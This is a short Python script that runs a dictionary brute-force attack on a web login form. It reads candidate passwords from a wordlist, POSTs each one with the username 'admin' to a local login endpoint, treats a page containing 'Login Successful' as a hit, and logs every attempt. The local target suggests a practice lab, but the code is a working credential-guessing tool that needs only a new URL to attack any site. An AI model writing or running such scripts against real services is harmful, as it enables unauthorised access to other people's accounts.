import requests
from datetime import datetime

# Target URL and Wordlist Path
url = 'http://127.0.0.1:5000/login'
wordlist_file = 'wordlist.txt'
log_file = 'logs/login_attempts.log'

# Login credentials
username = 'admin'

def log_attempt(result, password):
    with open(log_file, 'a') as log:
        log.write(f"{datetime.now()} - Attempt: {password} - {result}\n")

def brute_force():
    # Open wordlist file
    with open(wordlist_file, 'r') as f:
        for password in f:
            password = password.strip()
            
            # Create payload
            payload = {'username': username, 'password': password}
            
            # Send POST request
            response = requests.post(url, data=payload)
            
            # Check the response to see if the login was successful
            if "Login Successful" in response.text:
                print(f"Success: {password}")
                log_attempt("SUCCESS", password)
                break
            else:
                print(f"Failed: {password}")
                log_attempt("FAILURE", password)

if __name__ == "__main__":
    brute_force()
